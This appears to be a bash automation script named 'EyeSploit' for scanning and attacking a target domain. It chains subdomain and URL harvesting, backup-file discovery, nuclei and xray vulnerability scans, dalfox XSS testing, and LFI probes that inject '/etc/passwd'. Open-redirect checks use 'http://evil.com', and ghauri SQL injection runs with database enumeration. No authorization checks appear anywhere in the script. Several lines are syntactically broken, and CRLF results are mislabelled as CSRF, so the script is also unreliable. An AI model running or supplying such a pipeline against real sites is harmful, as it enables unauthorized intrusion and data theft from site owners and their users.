#!/bin/bash

## colors
BOLD="\e[1m"
CYAN='\033[0;36m'
RED='\033[0;31m'
black='\033[0;30m'
green='\033[0;32m'
yellow='\033[0;33m'
magenta='\033[0;35m'
NC='\033[0m' # No Color
echo -e "$RED${BOLD} -                                                                  - ${NC}"
echo -e "$CYAN${BOLD}███████╗██╗░░░██╗███████╗░██████╗██████╗░██╗░░░░░░█████╗░██╗████████╗${NC}"
echo -e "$CYAN${BOLD}██╔════╝╚██╗░██╔╝██╔════╝██╔════╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝${NC}"
echo -e "$CYAN${BOLD}█████╗░░░╚████╔╝░█████╗░░╚█████╗░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░${NC}"
echo -e "$CYAN${BOLD}██╔══╝░░░░╚██╔╝░░██╔══╝░░░╚═══██╗██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░${NC}"
echo -e "$CYAN${BOLD}███████╗░░░██║░░░███████╗██████╔╝██║░░░░░███████╗╚█████╔╝██║░░░██║░░░${NC}"
echo -e "$CYAN${BOLD}╚══════╝░░░╚═╝░░░╚══════╝╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░${NC}"
echo -e "$RED${BOLD} -                                                                  - ${NC}"
echo -e "$magenta Scan/Exploit - by @$green${BOLD}00xZ$NC /$green${BOLD} Eyezik     ${NC}"

echo " "
help() {
    echo -e "$CYAN${BOLD}Usage:${NC}"
    echo -e "${BOLD}    --help            Shows the help menu${NC}"
    echo -e "${BOLD}    --scan           Subdomains/gau(website history)/pars{NC}"
    echo -e "${BOLD}    --exploit           Subenum + alive + params + vuln${NC}"
    echo -e "$RED${BOLD}    --custom           Custom exploit modules ${NC}"
    exit 0
}

if [ "$1" == "--help" ]; then
    help
fi

domain=$2
#if [ -z "$domain" ]; then
#    echo -e "${RED}Please provide a domain.${NC}"
#    help
#fi
#if [[ ${domain:0:5} == "https" ]]; then
#        domain=${domain:8:${#domain}-8}
#elif [[ ${domain:0:4} == "http" ]]; then
#        domain=${domain:7:${domain}-7}
#fi
#if [ -d output/$domain ]; then
#        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
#        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
#        read -p " " delete
#        if [[ $delete == 'y' ]]; then
#                rm -rf output/$domain
#        else
#                exit 2
#        fi
#fi
#mkdir -p output/$domain/
#mkdir -p output/$domain/xray

vuln1() {
	if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    #mkdir -p output/$domain/xray
    read -p " [?] Deep scan(d) or light scan(l)? [d/l]: " sub
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    if [[ $sub == 'l' || $sub == 'L' ]]; then
            trap : SIGINT
            echo -e "$green [+]$CYAN Get All Urls "
            gau $domain > output/$domain/raw_urls.txt
            echo -e "$green [+]$RED Sub Finder "
            subfinder -d $domain -silent -all | anew output/$domain/subs.txt
            echo -e "$green [+]$yellow Sub Life Check "
            cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
            #gau_s $domain > output/$domain/raw_urls.txt
    else
            trap : SIGINT
            waymore -i $domain -oU output/$domain/raw_urls.txt
    fi
    #if [ "$3" == "--sub" ]; then
    #    subfinder -d $domain -silent -all | anew output/$domain/subs.txt
        #findomain --taget $domain --quiet | anew
    #    cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    #elif [ "$3" == "--deep-sub" ]; then
    #    echo -e "${RED} ADDING SOON ${NC}"
    #    #./deepsub --domain 
    #else
    #    echo -e "${RED} Not Scanning Subdomains ${NC}"
    #fi
    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing ${NC}"
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/raw_urls.txt | gf sqli > output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Life Check "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt
    dirsearch -l output/$domain/subs_alive.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output/$domain/hidden_dir.txt

}

vuln2() {
    mkdir -p output/$domain/xray
    echo -e "$CYAN$HTTP Scanning ${NC}"
    httpx -silent -l output/$domain/subs.txt | anew output/$domain/alive.txt

    echo -e "$CYANParameters search${NC}"
    paramspider -l output/$domain/alive.txt && mv results output/$domain/
    #cd results/
    cat output/$domain/results/* > output/$domain/params.txt

    echo -e "$RED${BOLD} \n Vulnerability Scanning \n${NC}"
    cd tools/
    nuclei ../output/$domain/params.txt -t ~/nuclei-templates -es info,unknown -etags ssl,tcp,code,javascript,whois | anew ../output/$domain/_nuclei.txt
    cat ../output/$domain/params.txt | xargs -I @ sh -c './xray_linux_amd64 ws --url @ --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal,crlf-injection,dirscan --html-output ../output/$domain/xray/"xray_$(echo @ | tr / _).html"'
}

vuln3() {
	echo -e "$RED${BOLD} --- $green${BOLD}Custom Exploit Scan $RED${BOLD}--- ${NC} \n"
    echo -e "$CYAN${BOLD} \n [!] XSS Scan: \n${NC}"
    cat output/$domain/gxss_dump.txt | dalfox pipe -o cat output/$domain/VULN_xss.txt
    [ -s output/$domain/VULN_xss.txt ] && echo -e "$green${BOLD} [+] VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
    crlfuzz -l output/$domain/subs.txt -o output/$domain/VULN_csrf.txt
    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"

    cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"'
    cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host $green${BOLD} Open Redir. Vulnerable\n" ;done
    cat output/$domain/sqli.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch' | anew output/$domain/VULN_sqli.txt
}

if [ "$1" == "--scan" ]; then
    vuln1
elif [ "$1" == "--exploit" ]; then
    vuln2
elif [ "$1" == "--custom" ]; then
    vuln3
else
    echo -e "${RED}Unknown option: $1 ${NC}"
    help
fi
